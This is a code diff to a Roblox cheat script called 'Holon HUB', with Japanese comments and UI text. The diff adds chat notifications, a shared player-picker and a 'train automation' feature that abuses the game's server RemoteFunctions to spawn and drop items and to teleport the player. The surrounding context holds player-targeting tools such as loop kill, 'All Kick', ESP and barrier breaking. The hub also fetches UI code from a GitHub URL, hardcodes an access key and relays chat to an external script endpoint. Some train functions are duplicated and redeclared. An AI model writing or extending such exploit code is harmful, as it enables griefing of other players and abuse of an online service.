@@ -27,7 +27,8 @@ local DetailIcon = "rbxassetid://7733964719"
 
 local OrionLib = nil
 local UIElements = {}
-local targetMainName = ""
+local targetMainName = LocalPlayer.Name
+local targetSubName = LocalPlayer.Name
 
 -- --- 保存・復元のために変数のスコープを上に移動 ---
 local superStrengthEnabled = false
@@ -47,6 +48,56 @@ local DiscordWebhookURL = "https://script.google.com/macros/s/AKfycbzILlYQt7HSFp
 
 local selectedChatMode = "Global" -- "Global", "Server", "Private"
 local selectedChatTarget = ""     -- 個人チャットの相手
+local chatNotifyEnabled = true
+local seenChatMessageKeys = {}
+local hasInitializedChatHistory = false
+
+local function getChatEntryKey(entry)
+    return table.concat({
+        tostring(entry.time or ""),
+        tostring(entry.user or entry.username or entry.Name or ""),
+        tostring(entry.msg or entry.content or ""),
+        tostring(entry.mode or "Global"),
+        tostring(entry.serverId or ""),
+        tostring(entry.target or "")
+    }, "|")
+end
+
+local function isChatEntryVisibleInCurrentMode(entry)
+    local myName = LocalPlayer.Name
+    local eMode = entry.mode or "Global"
+    if selectedChatMode == "Global" then
+        return eMode == "Global"
+    elseif selectedChatMode == "Server" then
+        return eMode == "Server" and entry.serverId == tostring(game.JobId)
+    elseif selectedChatMode == "Private" then
+        if eMode ~= "Private" then
+            return false
+        end
+        local senderName = entry.user or entry.username or ""
+        return (senderName:find("@" .. myName) and entry.target == selectedChatTarget)
+            or (entry.target == myName and senderName:find("@" .. selectedChatTarget))
+    end
+    return false
+end
+
+local function notifyNewChatEntries(newEntries)
+    if not chatNotifyEnabled or not OrionLib then
+        return
+    end
+
+    for _, entry in ipairs(newEntries) do
+        local user = entry.user or entry.username or entry.Name or "Player"
+        local msg = tostring(entry.msg or entry.content or "")
+        if not user:find("@" .. LocalPlayer.Name, 1, true) and isChatEntryVisibleInCurrentMode(entry) then
+            OrionLib:MakeNotification({
+                Name = "新着チャット",
+                Content = user .. ": " .. msg:sub(1, 80),
+                Time = 4
+            })
+        end
+    end
+end
 
 -- --- チャット送信専用関数 ---
 local function sendToExternalChat(user, msg, mode, target)
@@ -84,10 +135,12 @@ local function updateChatUI()
     if not UIElements.ChatLogPara then return end
     
     local myName = LocalPlayer.Name
-    local text = "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    text = text .. "【現在のモード: " .. (selectedChatMode == "Global" and "世界全体" or selectedChatMode == "Server" and "サーバー内" or "個人: "..selectedChatTarget) .. "】\n"
-    text = text .. "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    local filteredMessages = {}
+    local header = "<font color=\"rgb(100, 100, 100)\">━━━━━━━━━━━━━━━━━━━━━━━━</font>\n"
+    header = header .. "<b>【モード: <font color=\"rgb(255, 255, 255)\">" .. (selectedChatMode == "Global" and "全体" or selectedChatMode == "Server" and "サーバー内" or "個人") .. "</font>】</b>\n"
+    header = header .. "<font color=\"rgb(100, 100, 100)\">━━━━━━━━━━━━━━━━━━━━━━━━</font>\n\n"
 
+    -- 1. まず現在のモードに合うメッセージだけを抽出
     for _, entry in ipairs(allChatData) do
         local shouldShow = false
         local eMode = entry.mode or "Global"
@@ -98,21 +151,64 @@ local function updateChatUI()
             if eMode == "Server" and entry.serverId == tostring(game.JobId) then shouldShow = true end
         elseif selectedChatMode == "Private" then
             if eMode == "Private" then
-                -- 自分から相手、または相手から自分へのメッセージのみ表示
-                if (entry.user:find("@" .. myName) and entry.target == selectedChatTarget) or
-                   (entry.user:find("@" .. selectedChatTarget) and entry.target == myName) then
+                local senderName = entry.user or entry.username or ""
+                if (senderName:find("@" .. myName) and entry.target == selectedChatTarget) or
+                   (entry.target == myName and senderName:find("@" .. selectedChatTarget)) then -- 自分が受信者で、相手が送信者
                     shouldShow = true
                 end
             end
         end
-
+        
         if shouldShow then
-            text = text .. string.format("👤 **%s**  \t\t[%s]\n", entry.user or "Unknown", entry.time or "??:??")
-            text = text .. string.format("   %s\n", entry.msg or "")
-            text = text .. "────────────────────────\n"
+            table.insert(filteredMessages, entry)
         end
     end
-    UIElements.ChatLogPara:Set(text)
+
+    -- 2. 全履歴を結合（OrionのParagraph内で古いものは上へ押し上げられる）
+    local finalText = header
+    
+    -- 過去ログを遡れるように表示件数を50件に増量
+    local startIdx = math.max(1, #filteredMessages - 50)
+    for i = startIdx, #filteredMessages do
+        local entry = filteredMessages[i]
+        local user = entry.user or entry.username or entry.Name or "Player"
+        local msg = entry.msg or entry.content or ""
+
+        -- 色の設定
+        local timeColor = "rgb(150, 150, 150)"
+        local userColor = "rgb(255, 255, 255)"
+        local msgColor = "rgb(220, 220, 220)"
+
+        if user:find("najayou777") or user:find("najryou777") then
+            userColor = "rgb(255, 215, 0)" -- 開発者: ゴールド
+        elseif user:find("@" .. myName) then
+            userColor = "rgb(85, 170, 255)" -- 自分: 空色
+        end
+
+        -- フォーマット適用（\n\n でメッセージごとのスペースを空ける）
+        finalText = finalText .. string.format(
+            "<font color=\"%s\">[%s]</font> <font color=\"%s\"><b>%s</b></font>: <font color=\"%s\">%s</font>\n\n",
+            timeColor, entry.time or "??:??",
+            userColor, user,
+            msgColor, msg
+        )
+    end
+
+    -- メッセージ更新後に一番下へ自動スクロール
+    local scroll = nil
+    if UIElements.ChatLogPara.Instance then
+        scroll = UIElements.ChatLogPara.Instance:FindFirstChild("Scroll", true)
+    end
+
+    if scroll then
+        task.spawn(function()
+            task.wait(0.05) -- テキストの描画更新を待つ
+            scroll.CanvasPosition = Vector2.new(0, 99999)
+        end)
+    end
+    
+    if #filteredMessages == 0 then finalText = finalText .. "表示できるメッセージはありません\n" end
+    UIElements.ChatLogPara:Set(finalText)
 end
 
 -- --- 履歴取得用関数 ---
@@ -135,6 +231,21 @@ local function fetchChatHistory()
     if success then
         local success2, data = pcall(function() return HttpService:JSONDecode(result) end)
         if success2 and type(data) == "table" then
+            local newEntries = {}
+            for _, entry in ipairs(data) do
+                local key = getChatEntryKey(entry)
+                if not seenChatMessageKeys[key] then
+                    seenChatMessageKeys[key] = true
+                    if hasInitializedChatHistory then
+                        table.insert(newEntries, entry)
+                    end
+                end
+            end
+            if not hasInitializedChatHistory then
+                hasInitializedChatHistory = true
+            elseif #newEntries > 0 then
+                notifyNewChatEntries(newEntries)
+            end
             allChatData = data
             updateChatUI()
         end
@@ -2580,6 +2691,306 @@ task.spawn(function()
     end
 end)
 
+-- ===== 列車自動化用 変数と関数 =====
+local TrainAutomationEnabled = false
+local TrainAutomationConnection = nil
+local occupiedSeats = {}
+local seatConnections = {}
+local firstTimeRiders = {}
+local allSeats = {}
+local TargetItemName = "InstrumentWoodwindOcarina"
+local SecondItemName = "FoodMayonnaise"
+
+local function getTrainItems()
+    local items = {}
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:IsA("RemoteFunction") and obj.Name == "HoldItemRemoteFunction" then
+            local holdPart = obj.Parent
+            if holdPart and holdPart.Name == "HoldPart" then
+                local item = holdPart.Parent
+                if item then
+                    table.insert(items, {
+                        Name = item.Name,
+                        Object = item,
+                        RemoteFunction = obj,
+                        DropRemoteFunction = holdPart:FindFirstChild("DropItemRemoteFunction"),
+                    })
+                end
+            end
+        end
+    end
+    return items
+end
+
+local function performTrainAutoAction(isFirstTime)
+    local items = getTrainItems()
+    local target, second
+    for _, item in pairs(items) do
+        if item.Name == TargetItemName then target = item end
+        if item.Name == SecondItemName then second = item end
+    end
+
+    local char = LocalPlayer.Character
+    if not char then return end
+
+    task.spawn(function()
+        if isFirstTime then
+            if not target then ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(TargetItemName, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.zero) end
+            if not second then ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(SecondItemName, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.zero) end
+            task.wait(1)
+            items = getTrainItems()
+            for _, item in pairs(items) do
+                if item.Name == TargetItemName then target = item end
+                if item.Name == SecondItemName then second = item end
+            end
+            if target then target.RemoteFunction:InvokeServer(target.Object, char) task.wait(0.1) end
+            if second then second.RemoteFunction:InvokeServer(second.Object, char) task.wait(0.1) end
+            pcall(function() ReplicatedStorage.HoldEvents.Use:FireServer(target.Object) end)
+            if target and target.DropRemoteFunction then target.DropRemoteFunction:InvokeServer(target.Object, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.new(0,900,0)) end
+            if second and second.DropRemoteFunction then second.DropRemoteFunction:InvokeServer(second.Object, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.new(0,900,0)) end
+        else
+            if not target then ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(TargetItemName, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.zero) task.wait(1) end
+            items = getTrainItems()
+            for _, item in pairs(items) do if item.Name == TargetItemName then target = item end end
+            if target then
+                target.RemoteFunction:InvokeServer(target.Object, char)
+                task.wait(0.3)
+                target.DropRemoteFunction:InvokeServer(target.Object, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.new(0,900,0))
+            end
+        end
+    end)
+end
+
+local function setupTrainSeat(seat)
+    if seatConnections[seat] then return end
+    seatConnections[seat] = seat:GetPropertyChangedSignal("Occupant"):Connect(function()
+        local humanoid = seat.Occupant
+        if humanoid then
+            local player = Players:GetPlayerFromCharacter(humanoid.Parent)
+            if player and TrainAutomationEnabled then
+                local isFirst = not firstTimeRiders[player.UserId]
+                firstTimeRiders[player.UserId] = true
+                performTrainAutoAction(isFirst)
+            end
+            local sitConn
+            sitConn = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
+                if not humanoid.Sit then
+                    if TrainAutomationEnabled then performTrainAutoAction(false) end
+                    sitConn:Disconnect()
+                end
+            end)
+        end
+    end)
+    table.insert(allSeats, seat)
+end
+
+local function startTrainSeatDetection()
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:IsA("Seat") and obj.Name == "Seat" then setupTrainSeat(obj) end
+    end
+end
+
+local function sitOnRandomEmptySeat()
+    local empty = {}
+    for _, seat in pairs(allSeats) do
+        if seat and seat.Parent and not seat.Occupant then table.insert(empty, seat) end
+    end
+    if #empty == 0 then
+        OrionLib:MakeNotification({Name = "座席なし", Content = "空いている座席がありません", Time = 2})
+        return
+    end
+    local seat = empty[math.random(1, #empty)]
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.Sit = false
+        task.wait(0.1)
+        char.HumanoidRootPart.CFrame = seat.CFrame + Vector3.new(0, 3, 0)
+        task.wait(0.1)
+        seat:Sit(char.Humanoid)
+    end
+end
+
+local function toggleTrainAutomation(v)
+    TrainAutomationEnabled = v
+    if v then
+        startTrainSeatDetection()
+        if TrainAutomationConnection then TrainAutomationConnection:Disconnect() end
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("Humanoid") then
+            TrainAutomationConnection = char.Humanoid.Seated:Connect(function(active)
+                if TrainAutomationEnabled then task.wait(0.1) performTrainAutoAction(active) end
+            end)
+        end
+        OrionLib:MakeNotification({Name = "列車自動化ON", Content = "乗車/降車時に自動アイテム操作を行います", Time = 3})
+    else
+        if TrainAutomationConnection then TrainAutomationConnection:Disconnect() end
+        OrionLib:MakeNotification({Name = "列車自動化OFF", Content = "停止しました", Time = 2})
+    end
+end
+
+-- 列車テレポート機能
+local function teleportToTrain()
+    local char = LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    local trains = {}
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj.Name:lower():find("train") or obj.Name:lower():find("engine") or obj.Name:lower():find("locomotive") then
+            if obj:IsA("BasePart") or obj:IsA("Model") then
+                table.insert(trains, obj)
+            end
+        end
+    end
+
+    if #trains > 0 then
+        local target = trains[1]
+        local targetCFrame = target:IsA("Model") and target:GetModelCFrame() or target.CFrame
+        root.CFrame = targetCFrame + Vector3.new(0, 5, 0)
+        OrionLib:MakeNotification({Name = "成功", Content = "列車にテレポートしました", Time = 2})
+    else
+        OrionLib:MakeNotification({Name = "エラー", Content = "列車が見つかりませんでした", Time = 2})
+    end
+end
+
+-- ===== 列車コントロール用 関数定義 =====
+local TrainAutomationEnabled = false
+local TrainAutomationConnection = nil
+local seatConnections = {}
+local firstTimeRiders = {}
+local allSeats = {}
+local TrainTargetItem = "InstrumentWoodwindOcarina"
+local TrainSecondItem = "FoodMayonnaise"
+
+local function getTrainItems()
+    local items = {}
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:IsA("RemoteFunction") and obj.Name == "HoldItemRemoteFunction" then
+            local holdPart = obj.Parent
+            if holdPart and holdPart.Name == "HoldPart" then
+                local item = holdPart.Parent
+                if item then
+                    table.insert(items, {
+                        Name = item.Name,
+                        Object = item,
+                        RemoteFunction = obj,
+                        DropRemoteFunction = holdPart:FindFirstChild("DropItemRemoteFunction"),
+                    })
+                end
+            end
+        end
+    end
+    return items
+end
+
+local function performTrainAutoAction(isFirstTime)
+    local char = LocalPlayer.Character
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+    
+    task.spawn(function()
+        local items = getTrainItems()
+        local target, second
+        for _, item in pairs(items) do
+            if item.Name == TrainTargetItem then target = item end
+            if item.Name == TrainSecondItem then second = item end
+        end
+
+        if isFirstTime then
+            if not target then ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(TrainTargetItem, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.zero) end
+            if not second then ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(TrainSecondItem, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.zero) end
+            task.wait(1)
+            items = getTrainItems()
+            for _, item in pairs(items) do
+                if item.Name == TrainTargetItem then target = item end
+                if item.Name == TrainSecondItem then second = item end
+            end
+            if target then target.RemoteFunction:InvokeServer(target.Object, char) task.wait(0.1) end
+            if second then second.RemoteFunction:InvokeServer(second.Object, char) task.wait(0.1) end
+            pcall(function() ReplicatedStorage.HoldEvents.Use:FireServer(target.Object) end)
+            if target and target.DropRemoteFunction then target.DropRemoteFunction:InvokeServer(target.Object, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.new(0,900,0)) end
+            if second and second.DropRemoteFunction then second.DropRemoteFunction:InvokeServer(second.Object, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.new(0,900,0)) end
+        else
+            if not target then ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(TrainTargetItem, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.zero) task.wait(1) end
+            items = getTrainItems()
+            for _, item in pairs(items) do if item.Name == TrainTargetItem then target = item end end
+            if target then
+                target.RemoteFunction:InvokeServer(target.Object, char)
+                task.wait(0.3)
+                target.DropRemoteFunction:InvokeServer(target.Object, char.HumanoidRootPart.CFrame * CFrame.new(0,900,0), Vector3.new(0,900,0))
+            end
+        end
+    end)
+end
+
+local function setupTrainSeat(seat)
+    if seatConnections[seat] then return end
+    seatConnections[seat] = seat:GetPropertyChangedSignal("Occupant"):Connect(function()
+        local humanoid = seat.Occupant
+        if humanoid then
+            local player = Players:GetPlayerFromCharacter(humanoid.Parent)
+            if player and player == LocalPlayer and TrainAutomationEnabled then
+                local isFirst = not firstTimeRiders[player.UserId]
+                firstTimeRiders[player.UserId] = true
+                performTrainAutoAction(isFirst)
+            end
+            local sitConn
+            sitConn = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
+                if not humanoid.Sit then
+                    if TrainAutomationEnabled then performTrainAutoAction(false) end
+                    sitConn:Disconnect()
+                end
+            end)
+        end
+    end)
+    table.insert(allSeats, seat)
+end
+
+local function teleportToTrain()
+    local char = LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local trains = {}
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj.Name:lower():find("train") or obj.Name:lower():find("engine") then
+            if obj:IsA("BasePart") or obj:IsA("Model") then table.insert(trains, obj) end
+        end
+    end
+    if #trains > 0 then
+        local target = trains[1]
+        root.CFrame = (target:IsA("Model") and target:GetModelCFrame() or target.CFrame) + Vector3.new(0, 5, 0)
+    else
+        OrionLib:MakeNotification({Name = "エラー", Content = "列車が見つかりません", Time = 2})
+    end
+end
+
+local function sitOnRandomEmptySeat()
+    local empty = {}
+    for _, seat in pairs(allSeats) do
+        if seat and seat.Parent and not seat.Occupant then table.insert(empty, seat) end
+    end
+    if #empty == 0 then
+        OrionLib:MakeNotification({Name = "座席なし", Content = "空いている座席がありません", Time = 2})
+        return
+    end
+    local seat = empty[math.random(1, #empty)]
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("Humanoid") then
+        char.Humanoid.Sit = false
+        task.wait(0.1)
+        char.HumanoidRootPart.CFrame = seat.CFrame + Vector3.new(0, 3, 0)
+        task.wait(0.1)
+        seat:Sit(char.Humanoid)
+    end
+end
+
+local function startTrainDetection()
+    for _, obj in pairs(Workspace:GetDescendants()) do
+        if obj:IsA("Seat") and obj.Name == "Seat" then
+            setupTrainSeat(obj)
+        end
+    end
+end
+
 --------------------------------------------------------------------------------
 -- [ESP & サブ機能] 更新ループ (Prometheus対応版)
 --------------------------------------------------------------------------------
@@ -3203,7 +3614,7 @@ end
 --------------------------------------------------------------------------------
 local KeyFileName = "HolonHub_Key.txt"
 local CorrectKey = "holox"
-local OrionUrl = "https://raw.githubusercontent.com/hololove1021/HolonHUB/refs/heads/main/source.txt"
+local OrionUrl = "https://raw.githubusercontent.com/hololove1021/HolonHUB/refs/heads/main/important/source/original.txt"
 
 -- [[ 1. メイン画面の関数 ]]
 local function StartHolonHUB()
@@ -3218,7 +3629,7 @@ local function StartHolonHUB()
     end)
 
     local Window = OrionLib:MakeWindow({
-        Name = "Holon HUB v1.5.2",
+        Name = "Holon HUB v1.5.5",
         HidePremium = false,
         SaveConfig = false, -- 初期化時の干渉を防ぐため無効化
         ConfigFolder = "HolonHUB",
@@ -3976,15 +4387,105 @@ local function StartHolonHUB()
         return objects
     end
 
-    -- プレイヤーリスト取得関数
-local function getPList()
+-- プレイヤーリスト取得関数
+local function formatPlayerOption(player)
+    return player.DisplayName .. " (@" .. player.Name .. ")"
+end
+
+local function getPList(includeNone)
     local plist = {}
+    if includeNone then
+        table.insert(plist, "なし")
+    end
     for _, p in ipairs(Players:GetPlayers()) do
-        -- 「表示名 (@ユーザー名)」の形式でテーブルに入れる
-        table.insert(plist, p.DisplayName .. " (@" .. p.Name .. ")")
+        table.insert(plist, formatPlayerOption(p))
     end
     return plist
 end
+
+local function parseSelectedPlayerName(v)
+    if not v or v == "選択してください" or v == "なし" or v == "..." then
+        return ""
+    end
+    return v:match("@([^)]+)") or ""
+end
+
+local function getPlayerDropdownIcon(v)
+    local name = parseSelectedPlayerName(v)
+    local player = name ~= "" and Players:FindFirstChild(name) or nil
+    if not player then
+        return nil
+    end
+    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=100&height=100&format=png"
+end
+
+local function withPlayerDropdownStyle(config)
+    config.Options = config.Options or getPList(config.IncludeNone)
+    config.IconProvider = getPlayerDropdownIcon
+    config.SelectedIconProvider = getPlayerDropdownIcon
+    config.HeaderHeight = 52
+    config.OptionHeight = 40
+    config.MaxVisibleOptions = 8
+    config.OptionTextSize = 15
+    config.SelectedTextSize = 15
+    config.IconSize = 24
+    return config
+end
+
+local registeredPlayerDropdowns = {}
+
+local function registerPlayerDropdown(dropdown, optionsProvider)
+    table.insert(registeredPlayerDropdowns, {
+        dropdown = dropdown,
+        optionsProvider = optionsProvider or getPList
+    })
+    return dropdown
+end
+
+local function refreshRegisteredPlayerDropdowns()
+    for i = #registeredPlayerDropdowns, 1, -1 do
+        local entry = registeredPlayerDropdowns[i]
+        local dropdown = entry.dropdown
+        if not (dropdown and dropdown.Refresh and dropdown.Set) then
+            table.remove(registeredPlayerDropdowns, i)
+        else
+            local currentValue = dropdown.Value
+            dropdown:Refresh(entry.optionsProvider(), true)
+            if currentValue and currentValue ~= "" and currentValue ~= "..." then
+                local selectedName = parseSelectedPlayerName(currentValue)
+                if selectedName ~= "" then
+                    local selectedPlayer = Players:FindFirstChild(selectedName)
+                    if selectedPlayer then
+                        currentValue = formatPlayerOption(selectedPlayer)
+                    end
+                end
+                dropdown:Set(currentValue)
+            end
+        end
+    end
+end
+
+local function buildPlayerListSignature()
+    local signature = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        table.insert(signature, player.Name .. ":" .. player.DisplayName)
+    end
+    table.sort(signature)
+    return table.concat(signature, "|")
+end
+
+local lastPlayerListSignature = ""
+
+task.spawn(function()
+    while true do
+        local signature = buildPlayerListSignature()
+        if signature ~= lastPlayerListSignature then
+            lastPlayerListSignature = signature
+            refreshRegisteredPlayerDropdowns()
+        end
+        task.wait(1)
+    end
+end)
 
 -- UI要素を管理するテーブル
 UIElements = {}
@@ -4047,7 +4548,8 @@ local AuraTab = Window:MakeTab({
     })
 
     local ChatSec = ChatTab:AddSection({ Name = "💬 グローバルチャット" })
-    UIElements.ChatLogPara = ChatSec:AddParagraph("チャット履歴 (最新15件)", "メッセージを待機中...")
+    local chatTitle = "チャット履歴"
+    UIElements.ChatLogPara = ChatSec:AddScrollParagraph(chatTitle, "メッセージを待機中...", 200)
 
     local currentTypedMsg = ""
 
@@ -4075,30 +4577,32 @@ local AuraTab = Window:MakeTab({
 
     ChatSec:AddDropdown({
         Name = "チャット範囲 (モード)",
-        Default = "グローバル",
-        Options = {"グローバル", "サーバー内のみ", "個人チャット"},
+        Default = "全体",
+        Options = {"全体", "サーバー内のみ", "個人チャット"},
         Callback = function(v)
-            if v == "グローバル" then selectedChatMode = "Global"
+            if v == "全体" then selectedChatMode = "Global"
             elseif v == "サーバー内のみ" then selectedChatMode = "Server"
             else selectedChatMode = "Private" end
             updateChatUI()
         end
     })
 
-    UIElements.ChatRecipientDropdown = ChatSec:AddDropdown({
+    UIElements.ChatRecipientDropdown = registerPlayerDropdown(ChatSec:AddDropdown(withPlayerDropdownStyle({
         Name = "送信先 (個人チャット用)",
         Default = "なし",
-        Options = getPList(),
+        IncludeNone = true,
         Callback = function(v)
-            selectedChatTarget = v:match("@([^)]+)") or ""
+            selectedChatTarget = parseSelectedPlayerName(v)
             updateChatUI()
         end
-    })
+    })), function()
+        return getPList(true)
+    end)
 
     -- プレイヤー追加時に受信先リストを更新
     Players.PlayerAdded:Connect(function()
         task.wait(0.5)
-        if UIElements.ChatRecipientDropdown then UIElements.ChatRecipientDropdown:Refresh(getPList(), true) end
+        refreshRegisteredPlayerDropdowns()
     end)
 
     UIElements.ChatInput = ChatSec:AddTextbox({
@@ -4109,11 +4613,19 @@ local AuraTab = Window:MakeTab({
     })
 
     ChatSec:AddButton({
-        Name = "メッセージを送信 🚀",
+        Name = "メッセージを送信",
         Callback = executeSend
     })
 
-    ChatSec:AddLabel("※送信すると開発者のDiscordに履歴が保存されます")
+    ChatSec:AddToggle({
+        Name = "新着チャット通知",
+        Default = true,
+        Callback = function(v)
+            chatNotifyEnabled = v
+        end
+    })
+
+    ChatSec:AddLabel("※全体の会話はDiscordに履歴が保存されます")
 
     -- 自動更新ループの開始
     task.spawn(function()
@@ -4153,16 +4665,18 @@ local DecoySec = DecoyTab:AddSection({
 })
 
 local decoyTargetDropdown = nil
-decoyTargetDropdown = DecoySec:AddDropdown({
+decoyTargetDropdown = registerPlayerDropdown(DecoySec:AddDropdown(withPlayerDropdownStyle({
     Name = "ターゲット",
     Default = "なし",
-    Options = getPList(),
+    IncludeNone = true,
     Callback = function(v)
-        local name = v:match("@([^)]+)")
+        local name = parseSelectedPlayerName(v)
         decoyTargetName = name or ""
         targetDecoy = Players:FindFirstChild(decoyTargetName)
     end
-})
+})), function()
+    return getPList(true)
+end)
 
 UIElements.DecoyFollowToggle = DecoySec:AddToggle({
     Name = "ターゲットを追跡",
@@ -4575,37 +5089,27 @@ local actionTargetDropdown = nil
 local loopKillTargetDropdown = nil
 
 local pDropMain
-UIElements.MainTargetDropdown = MainSec:AddDropdown({
+UIElements.MainTargetDropdown = registerPlayerDropdown(MainSec:AddDropdown(withPlayerDropdownStyle({
     Name = "メイン対象",
     Default = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")",
-    Options = getPList(),
     Callback = function(v)
-        -- @以降を正確に切り出す (アンダーバー等にも対応)
-        local name = v:match("@([^)]+)")
+        local name = parseSelectedPlayerName(v)
         targetMainName = name or LocalPlayer.Name
         targetMain = Players:FindFirstChild(targetMainName) or LocalPlayer
     end    
-})
+})))
 pDropMain = UIElements.MainTargetDropdown
 local currentCombinedSlot = 1
 local cl_Mode, cl_Item, cl_Count, cl_Speed, cl_Size, cl_Height, cl_Back, cl_RotX, cl_RotY, cl_RotZ
 
 Players.PlayerAdded:Connect(function()
     task.wait(0.5)
-    pDropMain:Refresh(getPList(), true)
-    if decoyTargetDropdown then decoyTargetDropdown:Refresh(getPList(), true) end
-    if tpDropdown then tpDropdown:Refresh(getPList(), true) end -- テレポート用
-    if actionTargetDropdown then actionTargetDropdown:Refresh(getPList(), true) end
-    if loopKillTargetDropdown then loopKillTargetDropdown:Refresh(getPList(), true) end
+    refreshRegisteredPlayerDropdowns()
 end)
 
 Players.PlayerRemoving:Connect(function()
     task.wait(0.5)
-    pDropMain:Refresh(getPList(), true)
-    if decoyTargetDropdown then decoyTargetDropdown:Refresh(getPList(), true) end
-    if tpDropdown then tpDropdown:Refresh(getPList(), true) end -- テレポート用
-    if actionTargetDropdown then actionTargetDropdown:Refresh(getPList(), true) end
-    if loopKillTargetDropdown then loopKillTargetDropdown:Refresh(getPList(), true) end
+    refreshRegisteredPlayerDropdowns()
 end)
 
 -- エフェクト有効化トグル
@@ -5265,31 +5769,28 @@ local SubTargetSec = SubTab:AddSection({
 })
 
 -- 1. ドロップダウンの作成
-local targetSubName = "" 
 
-UIElements.SubTargetDropdown = SubTargetSec:AddDropdown({
+UIElements.SubTargetDropdown = registerPlayerDropdown(SubTargetSec:AddDropdown(withPlayerDropdownStyle({
     Name = "対象選択",
     Default = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")",
-    Options = getPList(),
     Callback = function(v)
-        -- @以降のユーザー名を正確に切り出す
-        local name = v:match("@([^)]+)")
+        local name = parseSelectedPlayerName(v)
         targetSubName = name or LocalPlayer.Name
         
         -- 即座に最新のオブジェクトも一度取得しておく（既存コードとの互換性のため）
         targetSub = Players:FindFirstChild(targetSubName) or LocalPlayer
     end    
-})
+})))
 pDropSub = UIElements.SubTargetDropdown
 
 Players.PlayerAdded:Connect(function()
     task.wait(0.5)
-    pDropSub:Refresh(getPList(), true)
+    refreshRegisteredPlayerDropdowns()
 end)
 
 Players.PlayerRemoving:Connect(function()
     task.wait(0.5)
-    pDropSub:Refresh(getPList(), true)
+    refreshRegisteredPlayerDropdowns()
 end)
 
 -- プレイヤーリストは PlayerAdded / PlayerRemoving で自動更新
@@ -5328,7 +5829,40 @@ ViewSec:AddButton({
     end
 })
 
--- ESP設定セクション
+local BarrierSec = SubTab:AddSection({
+    Name = "バリア破壊"
+})
+
+-- 列車コントロールセクション
+local TrainControlSec = SubTab:AddSection({
+    Name = "列車コントロール"
+})
+
+TrainControlSec:AddToggle({
+    Name = "列車自動化を有効化",
+    Default = false,
+    Callback = function(v)
+        TrainAutomationEnabled = v
+        if v then 
+            startTrainDetection() 
+            OrionLib:MakeNotification({Name = "自動化ON", Content = "乗降時にアイテムを自動操作します", Time = 3})
+        end
+    end
+})
+
+TrainControlSec:AddButton({
+    Name = "ランダムな空席に座る",
+    Callback = sitOnRandomEmptySeat
+})
+
+TrainControlSec:AddButton({
+    Name = "列車へテレポート",
+    Callback = teleportToTrain
+})
+
+TrainControlSec:AddParagraph("自動化の詳細", "乗車/降車時にオカリナとマヨネーズを自動で使用・廃棄します。")
+
+-- ESP設定セクション (一番下に移動)
 local EspSec = SubTab:AddSection({
     Name = "ESP設定"
 })
@@ -5377,10 +5911,6 @@ UIElements.EspColor = EspSec:AddColorpicker({
     Callback = function(v)
         espCfg.ESPColor = v
     end	  
-})
-
-local BarrierSec = SubTab:AddSection({
-    Name = "バリア破壊"
 })
 
 BarrierSec:AddButton({
@@ -5665,21 +6195,13 @@ local actionTargetSection = ActionTab:AddSection({ Name = "対象アクション
 local selectedActionTargetName = ""
 actionTargetDropdown = nil
 
-local function parseSelectedPlayerName(v)
-    if v == "選択してください" then
-        return ""
-    end
-    return (v and v:match("@([^)]+)")) or ""
-end
-
-actionTargetDropdown = actionTargetSection:AddDropdown({
+actionTargetDropdown = registerPlayerDropdown(actionTargetSection:AddDropdown(withPlayerDropdownStyle({
     Name = "アクション対象",
     Default = "選択してください",
-    Options = getPList(),
     Callback = function(v)
         selectedActionTargetName = parseSelectedPlayerName(v)
     end
-})
+})))
 
 -- 対象リストは PlayerAdded / PlayerRemoving で自動更新
 
@@ -5953,12 +6475,15 @@ UIElements.BlobmanKick = actionTargetSection:AddToggle({
     end
 })
 
+-- StartHolonHUB 内の local 数を抑えるため、独立機能ごとにスコープを分割
+do
 -- All Kick with white-friend protection
 local allKickSec = ActionTab:AddSection({ Name = "All Kick" })
 local allKickGrabbedPlayers = {}
 local allKickCurrentBlob = nil
 local allKickWhiteFriends = {}
 _G.ProtectRealFriends = _G.ProtectRealFriends or false
+_G.ProtectPlayersInPlots = true
 
 local function isAllKickWhiteFriend(player)
     if _G.ProtectRealFriends then
@@ -5971,12 +6496,315 @@ local function isAllKickProtected(player)
     if isAllKickWhiteFriend(player) then
         return true
     end
-    local plotItems = Workspace:FindFirstChild("PlotItems")
